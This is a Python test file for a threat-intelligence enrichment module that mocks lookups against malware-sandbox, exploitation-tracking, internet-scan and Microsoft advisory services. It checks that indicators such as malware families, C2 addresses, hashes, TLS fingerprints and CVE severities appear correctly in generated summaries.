@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_triage_hash_not_found(mock_get, monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_triage_hash

    monkeypatch.setenv("TRIAGE_API_KEY", "fake_key_123")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"data": []}
    mock_get.return_value = mock_resp

    res = query_triage_hash("44d88612fea8a8f36de82e1278abb02f")
    assert res == "No records on tria.ge."


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_triage_hash_auth_and_rate_limits(mock_get, monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_triage_hash

    monkeypatch.setenv("TRIAGE_API_KEY", "fake_key_123")

    mock_resp = MagicMock()
    mock_resp.status_code = 401
    mock_get.return_value = mock_resp

    res = query_triage_hash("44d88612fea8a8f36de82e1278abb02f")
    assert "tria.ge Auth Error" in res

    mock_resp.status_code = 429
    res = query_triage_hash("44d88612fea8a8f36de82e1278abb02f")
    assert "tria.ge rate limit exceeded" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_triage_hash_success_with_config(mock_get, monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_triage_hash

    monkeypatch.setenv("TRIAGE_API_KEY", "fake_key_123")

    search_resp = MagicMock()
    search_resp.status_code = 200
    search_resp.json.return_value = {"data": [{"id": "241024-stealc123"}]}

    overview_resp = MagicMock()
    overview_resp.status_code = 200
    overview_resp.json.return_value = {
        "sample": {"id": "241024-stealc123", "score": 10},
        "analysis": {"score": 10, "family": ["stealc"], "tags": ["stealer", "trojan"]},
        "extracted": [
            {
                "config": {
                    "family": "stealc",
                    "c2": ["185.196.8.121:80", "http://c2.stealer.io/gate.php"],
                    "botnet": "build_v2",
                    "mutex": "StealcMutex1",
                }
            }
        ],
    }

    mock_get.side_effect = [search_resp, overview_resp]

    res = query_triage_hash("44d88612fea8a8f36de82e1278abb02f")
    assert "Family: stealc" in res
    assert "Score: 10/10" in res
    assert "Extracted C2: 185.196.8.121:80" in res
    assert "Botnet: build_v2" in res
    assert "Mutex: StealcMutex1" in res
    assert "Tags: stealer, trojan" in res


def test_generate_enrichment_summary_includes_triage():
    threat_intel = "Malware sample with MD5 44d88612fea8a8f36de82e1278abb02f observed."
    with patch(
        "hecate_agent.orchestrator.enrichment.query_triage_hash",
        return_value="Family: LummaC2 | Score: 10/10 | Extracted C2: 194.26.29.111",
    ):
        summary = generate_enrichment_summary(threat_intel)
        assert "Hatching Triage" in summary
        assert "Hatching Triage (tria.ge Sandbox):" in summary
        assert "Family: LummaC2" in summary


def test_query_vulncheck_cve_unconfigured():
    from hecate_agent.orchestrator.enrichment import query_vulncheck_cve

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value=""):
        res = query_vulncheck_cve("CVE-2024-3400")
        assert res == "VULNCHECK_API_KEY not configured."


def test_query_vulncheck_cve_invalid():
    from hecate_agent.orchestrator.enrichment import query_vulncheck_cve

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="test-key"):
        res = query_vulncheck_cve("not-a-cve")
        assert "Invalid CVE identifier" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_vulncheck_cve_success(mock_get):
    from hecate_agent.orchestrator.enrichment import query_vulncheck_cve

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "data": [
            {
                "cve": ["CVE-2024-3400"],
                "name": "PAN-OS Command Injection",
                "vendor": "Palo Alto Networks",
                "product": "PAN-OS GlobalProtect",
                "exploit_type": "weaponized",
                "vulncheck_reported_exploitation": True,
                "threat_actors": ["UTA0218"],
            }
        ]
    }
    mock_get.return_value = mock_resp

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="test-key"):
        res = query_vulncheck_cve("CVE-2024-3400")
        assert "weaponized" in res
        assert "in-the-wild: True" in res
        assert "Palo Alto Networks PAN-OS GlobalProtect" in res
        assert "UTA0218" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_vulncheck_cve_not_found(mock_get):
    from hecate_agent.orchestrator.enrichment import query_vulncheck_cve

    mock_resp = MagicMock()
    mock_resp.status_code = 404
    mock_get.return_value = mock_resp

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="test-key"):
        res = query_vulncheck_cve("CVE-2024-99999")
        assert "Not listed in VulnCheck KEV" in res


def test_generate_enrichment_summary_includes_vulncheck():
    threat_intel = "Active zero-day exploitation of CVE-2024-3400 reported in network gateway."
    with (
        patch(
            "hecate_agent.orchestrator.enrichment.query_vulncheck_cve",
            return_value="Status: weaponized (in-the-wild: True) · Target: Palo Alto Networks PAN-OS",
        ),
        patch(
            "hecate_agent.orchestrator.enrichment.query_epss_batch",
            return_value={"CVE-2024-3400": "EPSS: 92.5% (CRITICAL)"},
        ),
    ):
        summary = generate_enrichment_summary(threat_intel)
        assert "VulnCheck KEV (Active Exploitation):" in summary
        assert "Status: weaponized (in-the-wild: True)" in summary


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_censys_ip_with_fingerprints(mock_get):
    from hecate_agent.orchestrator.enrichment import query_censys_ip

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "result": {
            "services": [
                {
                    "port": 443,
                    "service_name": "HTTPS",
                    "tls": {
                        "jarm": "07d14d16d21d21d07c42d41407d41d4ae3d3e5896041892ff5da154584d1c4",
                        "ja4": "t13d1516h2_8daaf6152771_019a76b17a1d",
                        "certificate": {
                            "subject_dn": "CN=evil-c2.com, O=Malware Corp",
                        },
                    },
                }
            ]
        }
    }
    mock_get.return_value = mock_resp

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="censys-token"):
        res = query_censys_ip("198.51.100.22")
        assert "Open Ports: ['443']" in res
        assert "JARM: 07d14d16d21d" in res
        assert "JA4: t13d1516h2" in res
        assert "TLS Cert: CN=evil-c2.com" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_censys_ip_balance_and_errors(mock_get):
    from hecate_agent.orchestrator.enrichment import query_censys_ip

    mock_resp_422 = MagicMock()
    mock_resp_422.status_code = 422
    mock_get.return_value = mock_resp_422

    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="censys-token"):
        res = query_censys_ip("198.51.100.22")
        assert "insufficient credits/balance" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_shadowserver_ip(mock_get):
    from hecate_agent.orchestrator.enrichment import query_shadowserver_ip

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "asn": 15169,
        "asn_name": "Google LLC",
        "prefix": "8.8.8.0/24",
        "isp_name": "A2B IP",
    }
    mock_get.return_value = mock_resp

    res = query_shadowserver_ip("8.8.8.8")
    assert "ASN: AS15169 (Google LLC)" in res
    assert "Prefix: 8.8.8.0/24" in res
    assert "ISP: A2B IP" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_shadowserver_hash(mock_get):
    from hecate_agent.orchestrator.enrichment import query_shadowserver_hash

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = [
        {
            "import_hash": "68f013d7437aa653a8a98a05807afeb1",
            "anti_virus": [
                {"vendor": "K7", "signature": "Trojan.Generic"},
                {"vendor": "Eset", "signature": "Win32/Spy.Shiz.NBX"},
            ],
        }
    ]
    mock_get.return_value = mock_resp

    res = query_shadowserver_hash("84c82835a5d21bbcf75a61706d8ab549")
    assert "AV Detections: 2 hits" in res
    assert "Win32/Spy.Shiz.NBX" in res
    assert "imphash: 68f013d7437aa653a8a98a05807afeb1" in res


def test_generate_enrichment_summary_includes_shadowserver():
    threat_intel = "C2 node observed at 198.51.100.33 and hash 84c82835a5d21bbcf75a61706d8ab549."
    with (
        patch(
            "hecate_agent.orchestrator.enrichment.query_shadowserver_ip",
            return_value="ASN: AS12345 (Adversary ASN) · Prefix: 198.51.100.0/24",
        ),
        patch(
            "hecate_agent.orchestrator.enrichment.query_shadowserver_hash",
            return_value="AV Detections: 14 hits (Trojan.C2) · imphash: 68f013d7437aa653a8a98a05807afeb1",
        ),
    ):
        summary = generate_enrichment_summary(threat_intel)
        assert "Shadowserver Foundation" in summary
        assert "ASN: AS12345 (Adversary ASN)" in summary
        assert "AV Detections: 14 hits" in summary


def test_query_msrc_cve_invalid():
    from hecate_agent.orchestrator.enrichment import query_msrc_cve

    res = query_msrc_cve("invalid-cve")
    assert "Invalid CVE identifier" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_msrc_cve_success(mock_get):
    from hecate_agent.orchestrator.enrichment import query_msrc_cve, _fetch_msrc_document

    _fetch_msrc_document.cache_clear()

    updates_resp = MagicMock()
    updates_resp.status_code = 200
    updates_resp.json.return_value = {"value": [{"ID": "2024-Aug"}]}

    doc_resp = MagicMock()
    doc_resp.status_code = 200
    doc_resp.json.return_value = {
        "Vulnerability": [
            {
                "CVE": "CVE-2024-38063",
                "Title": {"Value": "Windows TCP/IP Remote Code Execution Vulnerability"},
                "CVSSScoreSets": [{"BaseScore": 9.8}],
                "Threats": [
                    {"Type": 3, "Description": {"Value": "Critical"}},
                    {"Type": 1, "Description": {"Value": "Exploitation More Likely"}},
                ],
            }
        ]
    }

    def side_effect(url, **kwargs):
        if "updates" in url:
            return updates_resp
        return doc_resp

    mock_get.side_effect = side_effect

    res = query_msrc_cve("CVE-2024-38063")
    assert "MSRC: Windows TCP/IP Remote Code Execution Vulnerability" in res
    assert "Severity: Critical" in res
    assert "CVSS: 9.8" in res
    assert "Exploitability: Exploitation More Likely" in res


def test_generate_enrichment_summary_includes_msrc():
    threat_intel = "Active exploitation of CVE-2024-38063 observed in corporate Windows servers."
    with (
        patch(
            "hecate_agent.orchestrator.enrichment.query_msrc_cve",
            return_value="MSRC: Windows TCP/IP RCE · Severity: Critical · CVSS: 9.8",
        ),
        patch(
            "hecate_agent.orchestrator.enrichment.query_epss_batch",
            return_value={"CVE-2024-38063": "EPSS: 94.2% (CRITICAL)"},
        ),
    ):
        summary = generate_enrichment_summary(threat_intel)
        assert "Microsoft MSRC (Security Guidance):" in summary
        assert "MSRC: Windows TCP/IP RCE · Severity: Critical · CVSS: 9.8" in summary
